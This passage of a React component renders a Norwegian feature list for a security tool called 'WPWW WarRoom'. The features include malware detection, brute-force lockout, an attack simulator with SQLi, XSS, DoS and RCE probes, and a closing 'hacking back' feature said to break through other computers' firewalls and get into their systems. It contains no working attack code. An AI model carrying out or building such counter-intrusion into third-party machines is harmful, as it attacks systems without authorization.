              Måler informasjonstetthet for å oppdage obfuskert skadevare og helt ukjente trusler som ikke har faste signaturer.
            </p>
          </div>

          {/* Feature 5: Brute Force-beskyttelse */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-amber-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Brute Force-beskyttelse</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Teller feilede innlogginger/forsøk per IP og sperrer dem automatisk ute ved gjentatte forsøk.
            </p>
          </div>

          {/* Feature 6: Krasjsikker Watchdog-daemon */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-cyan-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Krasjsikker Watchdog-daemon</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Gjenoppretter serverkjernen på millisekunder hvis en feil skulle oppstå, slik at enheten aldri stanser.
            </p>
          </div>

          {/* Feature 7: Angrepssimulator & Test-matrise */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-rose-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Angrepssimulator & Test-matrise</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Et innebygd bibliotek med testprober (SQLi, XSS, DoS, RCE) som kan kjøres fra menyen, med Av/På-bryter direkte i kontrollpanelet.
            </p>
          </div>

          {/* Feature 8: Avanserte Testscenarioer */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-amber-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Avanserte Testscenarioer</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Støtte for sverm-simulering (tilfeldige pakke-flommer), sekvensielle tester og stresstester.
            </p>
          </div>

          {/* Feature 9: Eksport av Forensiske Bevis */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-indigo-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Eksport av Forensiske Bevis</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Mulighet til å dumpe hele loggen og bevisene til offisiell JSON, CSV, XML, STIX, YARA, Markdown, HTML og Syslog på disken.
            </p>
          </div>

          {/* Feature 10: Nettverksbryter */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-cyan-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Nettverksbryter (127.0.0.1 vs 0.0.0.0)</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Veksle enkelt mellom å lytte på 127.0.0.1 (kun din maskin) eller 0.0.0.0 (hele lokalnettverket / Wi-Fi).
            </p>
          </div>

          {/* Feature 11: Vedlikeholdsverktøy */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-emerald-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Vedlikeholdsverktøy & Svartelister</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Menypunkter for å tømme svartelister, administrere blokkerte IP-er og rotere kryptografiske nøkler.
            </p>
          </div>

          {/* Feature 12: Modulær Utvidelse */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-slate-800 hover:border-slate-700 space-y-1.5 transition-all">
            <div className="flex items-center gap-2 text-purple-300 font-bold">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
              <span>Modulær Utvidelse (/custom_modules)</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Støtte for å slippe egne Python-skript inn i /custom_modules-mappen for fremtidige utvidelser (Plug & Play).
            </p>
          </div>

          {/* Feature 13: Aktiv Inntrengning / Motoffensiv */}
          <div className="p-3.5 rounded-xl bg-slate-900/70 border border-rose-900/60 hover:border-rose-700 space-y-1.5 transition-all md:col-span-2 lg:col-span-3">
            <div className="flex items-center gap-2 text-rose-400 font-bold">
              <Swords className="w-4 h-4 text-rose-400 flex-shrink-0" />
              <span>Aktiv Inntrengning ("Hacking back" / Angripe angriperen) & Wiper-Mottiltak</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              Funksjonalitet for å bryte seg gjennom en fremmed datamaskins brannmur, snike seg inn på deres system, og beskytte mot fjernstyrt skadevare/wiper (formatering og sletting). WPWW WarRoom er designet som et kompromissløst, selvgående forsvarsverk og forensisk system som beskytter din egen maskin maksimalt og har kraftige motoffensiver ved forsøk på hacking av programmet.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
